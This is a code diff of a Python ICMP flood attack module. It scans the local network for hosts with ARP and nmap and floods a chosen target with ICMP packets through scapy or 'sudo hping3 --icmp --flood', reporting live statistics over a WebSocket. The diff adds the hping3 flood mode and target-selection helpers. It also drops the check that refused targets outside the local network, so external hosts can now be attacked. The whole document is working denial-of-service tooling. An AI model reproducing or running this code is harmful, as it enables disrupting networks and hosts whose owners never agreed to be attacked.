@@ -3,6 +3,8 @@ import time
 import threading
 import socket
 import ipaddress
+import os
+import re
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP
 import json
@@ -11,7 +13,11 @@ import asyncio
 import netifaces
 
 class ICMPFloodAttack:
-    def __init__(self, interface, websocket=None):
+    def __init__(self, interface=None, websocket=None, use_hping3=False):
+        # Auto-detect interface if not provided
+        if interface is None:
+            interface = self.auto_detect_interface()
+        
         self.interface = interface
         self.websocket = websocket
         self.running = False
@@ -28,11 +34,75 @@ class ICMPFloodAttack:
         }
         self.discovered_clients = []
         self.error_log = []
+        self.use_hping3 = use_hping3
+        self.hping3_proc = None
+
+    def auto_detect_interface(self):
+        """Auto-detect the main network interface (prefer wlan0)"""
+        try:
+            interfaces = [iface for iface in os.listdir("/sys/class/net") 
+                         if iface not in ["lo", "docker0"]]
+            
+            # Prefer wlan0 if available
+            if "wlan0" in interfaces:
+                return "wlan0"
+            elif interfaces:
+                return interfaces[0]
+            else:
+                raise Exception("No valid network interface found")
+        except Exception as e:
+            self.error_log.append(f"Interface auto-detection failed: {e}")
+            return "wlan0"  # fallback
+
+    def get_interface_ip_range(self, interface):
+        """Get the IP range from interface using ip command (like reference script)"""
+        try:
+            output = subprocess.check_output(f"ip addr show {interface}", 
+                                           shell=True, text=True)
+            match = re.search(r"inet (\d+\.\d+\.\d+)\.\d+/\d+", output)
+            if match:
+                base_ip = match.group(1)
+                return f"{base_ip}.0/24"
+            else:
+                raise Exception(f"No IP address found for {interface}")
+        except Exception as e:
+            self.error_log.append(f"Error getting IP range for {interface}: {e}")
+            return None
+
+    def arp_scan_simple(self, ip_range):
+        """Simple ARP scan like the reference script"""
+        try:
+            arp_responses = []
+            answered_lst = arping(ip_range, verbose=0)[0]
+            for res in answered_lst:
+                arp_responses.append({
+                    "ip": res[1].psrc, 
+                    "mac": res[1].hwsrc,
+                    "method": "arp_scan_simple"
+                })
+            return arp_responses
+        except Exception as e:
+            self.error_log.append(f"Simple ARP scan failed: {e}")
+            return []
 
     # ADD THIS METHOD ↓↓↓
     def start_attack_bg(self, target_ip, packet_size=64, delay=0.001):
-        import asyncio
-        asyncio.run(self.start_attack(target_ip, packet_size, delay))
+        """Background wrapper for starting the attack"""
+        try:
+            # Create a new event loop for this thread
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            
+            # Run the attack
+            loop.run_until_complete(self.start_attack(target_ip, packet_size, delay))
+        except Exception as e:
+            print(f"ICMP attack background error: {e}")
+            self.error_log.append(f"Background attack error: {e}")
+        finally:
+            try:
+                loop.close()
+            except:
+                pass
 
     async def send_status_update(self, message_type, data):
         """Send status update via WebSocket"""
@@ -104,29 +174,50 @@ class ICMPFloodAttack:
             self.error_log.append(f"Network check failed: {e}")
             return False, None
     
-    def discover_network_clients(self, network_range):
-        """Discover clients on the same network using ARP scan"""
+    def discover_network_clients(self, network_range=None):
+        """Discover clients on the same network using improved ARP scan"""
         try:
             clients = []
             
-            # Method 1: Scapy ARP scan
+            # Use provided network range or get from interface
+            if network_range is None:
+                network_range = self.get_interface_ip_range(self.interface)
+                if not network_range:
+                    self.error_log.append("Could not determine network range")
+                    return []
+            
+            print(f"[ICMPFlood] Scanning network {network_range} on interface {self.interface}")
+            
+            # Method 1: Simple ARP scan (like reference script)
+            try:
+                simple_clients = self.arp_scan_simple(network_range)
+                clients.extend(simple_clients)
+                print(f"[ICMPFlood] Simple ARP scan found {len(simple_clients)} clients")
+            except Exception as e:
+                self.error_log.append(f"Simple ARP scan failed: {e}")
+            
+            # Method 2: Enhanced ARP scan with Scapy
             try:
                 answered, unanswered = arping(network_range, timeout=2, verbose=False)
                 for sent, received in answered:
                     client_ip = received.psrc
                     client_mac = received.hwsrc
                     
-                    # Skip our own IP and gateway
-                    if client_ip != self.our_ip and not client_ip.endswith('.1'):
+                    # Skip our own IP and gateway, avoid duplicates
+                    if (client_ip != self.our_ip and 
+                        not client_ip.endswith('.1') and
+                        not any(c['ip'] == client_ip for c in clients)):
+                        
                         clients.append({
                             'ip': client_ip,
                             'mac': client_mac,
-                            'method': 'arp_scan'
+                            'method': 'arp_scan_enhanced'
                         })
+                print(f"[ICMPFlood] Enhanced ARP scan found {len([c for c in clients if c['method'] == 'arp_scan_enhanced'])} additional clients")
             except Exception as e:
-                self.error_log.append(f"ARP scan failed: {e}")
+                self.error_log.append(f"Enhanced ARP scan failed: {e}")
             
-            # Method 2: Nmap scan as backup
+            # Method 3: Nmap scan as backup
             try:
                 result = subprocess.run(['nmap', '-sn', network_range], 
                                       capture_output=True, text=True, timeout=30)
@@ -153,39 +244,9 @@ class ICMPFloodAttack:
                                 'method': 'nmap_scan'
                             })
                         current_ip = None
+                print(f"[ICMPFlood] Nmap scan found {len([c for c in clients if c['method'] == 'nmap_scan'])} additional clients")
             except Exception as e:
                 self.error_log.append(f"Nmap scan failed: {e}")
-            
-            # Method 3: ARP table as final backup
-            try:
-                result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
-                for line in result.stdout.split('\n'):
-                    if '(' in line and ')' in line:
-                        try:
-                            parts = line.split()
-                            ip = parts[1].strip('()')
-                            
-                            # Find MAC address in the line
-                            for part in parts:
-                                if ':' in part and len(part.split(':')) == 6:
-                                    mac = part
-                                    break
-                            
-                            # Skip our IP and gateway, avoid duplicates
-                            if (ip != self.our_ip and 
-                                not ip.endswith('.1') and
-                                not any(c['ip'] == ip for c in clients)):
-                                
-                                clients.append({
-                                    'ip': ip,
-                                    'mac': mac,
-                                    'method': 'arp_table'
-                                })
-                            break
-                        except:
-                            continue
-            except Exception as e:
-                self.error_log.append(f"ARP table scan failed: {e}")
             
             # Test connectivity to discovered clients
             active_clients = []
@@ -203,12 +264,14 @@ class ICMPFloodAttack:
                 except:
                     client['status'] = 'unknown'
             
-            return active_clients if active_clients else clients
+            final_clients = active_clients if active_clients else clients
+            print(f"[ICMPFlood] Total clients discovered: {len(final_clients)}")
+            return final_clients
             
         except Exception as e:
             self.error_log.append(f"Client discovery failed: {e}")
             return []
-    
+
     def extract_ping_time(self, ping_output):
         """Extract ping response time from ping output"""
         try:
@@ -235,9 +298,26 @@ class ICMPFloodAttack:
             return None
     
     def flood_target(self, target_ip, packet_size=64, delay=0.001):
-        """Send ICMP flood to target"""
+        print(f"[ICMPFlood] flood_target started for {target_ip} (packet_size={packet_size}, delay={delay}, use_hping3={self.use_hping3})")
+        if self.use_hping3:
+            try:
+                # Launch hping3 as a subprocess
+                cmd = ["sudo", "hping3", "--icmp", "--flood", target_ip, "-I", self.interface]
+                print(f"[ICMPFlood] Running: {' '.join(cmd)}")
+                self.hping3_proc = subprocess.Popen(cmd)
+                while self.running and self.hping3_proc.poll() is None:
+                    time.sleep(1)
+                if self.hping3_proc.poll() is None:
+                    self.hping3_proc.terminate()
+                print(f"[ICMPFlood] hping3 process ended.")
+            except Exception as e:
+                print(f"[ICMPFlood] hping3 error: {e}")
+                self.stats['errors'] += 1
+                self.error_log.append(f"hping3 error: {e}")
+            return
         packet = self.create_icmp_packet(target_ip, packet_size)
         if not packet:
+            print("[ICMPFlood] Failed to create packet!")
             return
         
         packet_count = 0
@@ -250,6 +330,8 @@ class ICMPFloodAttack:
                 self.stats['packets_sent'] += 1
                 self.stats['bytes_sent'] += len(packet)
                 packet_count += 1
+                if packet_count % 100 == 0:
+                    print(f"[ICMPFlood] Sent {self.stats['packets_sent']} packets so far...")
                 
                 # Update stats every 100 packets
                 if packet_count % 100 == 0:
@@ -260,22 +342,24 @@ class ICMPFloodAttack:
                             self.stats['packets_per_second'] = self.stats['packets_sent'] / self.stats['duration']
                     
                     # Send stats update every 2 seconds
-                    if current_time - last_stats_time >= 2:
-                        asyncio.create_task(self.send_status_update('stats_update', self.get_current_stats()))
-                        last_stats_time = current_time
+                    try:
+                        loop = asyncio.get_event_loop()
+                        if loop.is_running():
+                            asyncio.create_task(self.send_status_update('stats_update', self.get_current_stats()))
+                    except RuntimeError:
+                        self.error_log.append("No event loop available for status update")
+                    last_stats_time = current_time
                 
                 # Small delay to prevent overwhelming
                 if delay > 0:
                     time.sleep(delay)
                 
             except Exception as e:
+                print(f"[ICMPFlood] Packet send error: {e}")
                 self.stats['errors'] += 1
                 self.error_log.append(f"Packet send error: {e}")
-                import asyncio
-                asyncio.run(self.send_status_update('error', {
-                	"message": f"Packet send error: {e}"
-                }))
                 time.sleep(0.1)  # Longer delay on error
+        print(f"[ICMPFlood] flood_target exiting for {target_ip}")
     
     def get_current_stats(self):
         """Get current attack statistics"""
@@ -285,12 +369,12 @@ class ICMPFloodAttack:
         return {
             'target_ip': self.target_ip,
             'packets_sent': self.stats['packets_sent'],
-            'bytes_sent': self.stats['bytes_sent'],
+            'start_time': self.stats['start_time'],
             'duration': self.stats['duration'],
-            'packets_per_second': self.stats['packets_per_second'],
             'errors': self.stats['errors'],
+            'packets_per_second': self.stats['packets_sent'] / max(self.stats['duration'], 1),
             'status': 'running' if self.running else 'stopped',
-            'mbps': (self.stats['bytes_sent'] * 8 / 1024 / 1024) / max(self.stats['duration'], 1)
+            'running': self.running
         }
     
     async def start_attack(self, target_ip, packet_size=64, delay=0.001):
@@ -321,15 +405,15 @@ class ICMPFloodAttack:
                 our_network = ipaddress.IPv4Network(self.network_range, strict=False)
                 
                 if target_network not in our_network:
-                    await self.send_status_update('error', {
-                        'message': f'Target {target_ip} is not in local network {self.network_range}'
+                    await self.send_status_update('warning', {
+                        'message': f'Target {target_ip} is not in local network {self.network_range}. This may still work for external targets.'
                     })
-                    return False
+                    # Don't return False - allow external targets
             except Exception as e:
-                await self.send_status_update('error', {
-                    'message': f'Invalid target IP: {e}'
+                await self.send_status_update('warning', {
+                    'message': f'Could not validate target IP: {e}'
                 })
-                return False
+                # Don't return False - continue with attack
             
             # Test target reachability
             try:
@@ -387,14 +471,21 @@ class ICMPFloodAttack:
     async def stop_attack(self):
         """Stop ICMP flood attack"""
         self.running = False
-        
+        if self.use_hping3 and self.hping3_proc is not None:
+            try:
+                print("[ICMPFlood] Terminating hping3 process...")
+                self.hping3_proc.terminate()
+                self.hping3_proc.wait(timeout=3)
+                print("[ICMPFlood] hping3 process terminated.")
+            except Exception as e:
+                print(f"[ICMPFlood] Error terminating hping3: {e}")
+                self.error_log.append(f"Error terminating hping3: {e}")
         final_stats = self.get_current_stats()
         await self.send_status_update('attack_stopped', {
             'message': 'ICMP flood attack stopped',
             'final_stats': final_stats,
             'errors': self.error_log if self.error_log else None
         })
-        
         return final_stats
     
     async def discover_clients(self):
@@ -436,6 +527,30 @@ class ICMPFloodAttack:
                 'message': f'Client discovery failed: {e}',
                 'errors': self.error_log
             })
+            return []
+
+    def get_targets_for_selection(self):
+        """Get targets in a format suitable for user selection (like reference script)"""
+        try:
+            clients = self.discover_network_clients()
+            if not clients:
+                return []
+            
+            # Format like the reference script
+            targets = []
+            for i, client in enumerate(clients):
+                targets.append({
+                    'id': i,
+                    'ip': client['ip'],
+                    'mac': client['mac'],
+                    'status': client.get('status', 'unknown'),
+                    'response_time': client.get('response_time', 0),
+                    'method': client.get('method', 'unknown')
+                })
+            
+            return targets
+        except Exception as e:
+            self.error_log.append(f"Target selection failed: {e}")
             return []
 
 # Legacy functions for backward compatibility
